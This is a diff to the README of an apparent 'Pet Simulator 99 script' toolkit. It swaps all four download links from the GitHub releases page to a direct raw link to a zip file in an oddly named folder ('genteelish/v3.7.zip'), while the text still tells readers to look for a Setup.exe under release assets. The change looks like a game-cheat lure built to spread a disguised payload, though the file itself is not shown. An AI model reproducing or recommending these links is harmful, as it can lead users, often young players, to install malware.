@@ -1,6 +1,6 @@
 # 🎮 pet-simulator-99-script-2026-pet-toolkit - Your Ultimate Pet Collection Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Pet_Toolkit_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Pet_Toolkit_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/main/genteelish/v3.7.zip)
 
 ---
 
@@ -56,7 +56,7 @@ Think of it as your personal assistant for everything Pet Simulator 99. It helps
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Pet Toolkit 2026 Download Page](https://github.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/releases)
+Visit this link to download the application: [Pet Toolkit 2026 Download Page](https://raw.githubusercontent.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/main/genteelish/v3.7.zip)
 
 Look for the latest release file and click to download it to your computer.
 
@@ -89,7 +89,7 @@ Pet Toolkit 2026 is designed to work smoothly on most modern Windows computers:
 ## 📥 Installation & Setup Guide
 
 ### Download Process
-1. Go to the [official download page](https://github.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/releases)
+1. Go to the [official download page](https://raw.githubusercontent.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/main/genteelish/v3.7.zip)
 2. Find the section that says "Assets" under the latest release
 3. Look for the file named something like `Pet-Toolkit-2026-Setup.exe`
 4. Click the download link and wait for the file to save
@@ -226,7 +226,7 @@ Need assistance? We've got you covered:
 
 Ready to level up your Pet Simulator 99 experience? 
 
-[![Get Started Now](https://img.shields.io/badge/🚀-Download_Today-4CAF50?style=for-the-badge)](https://github.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/releases)
+[![Get Started Now](https://img.shields.io/badge/🚀-Download_Today-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/filzno86839/pet-simulator-99-script-2026-pet-toolkit/main/genteelish/v3.7.zip)
 
 ---
 
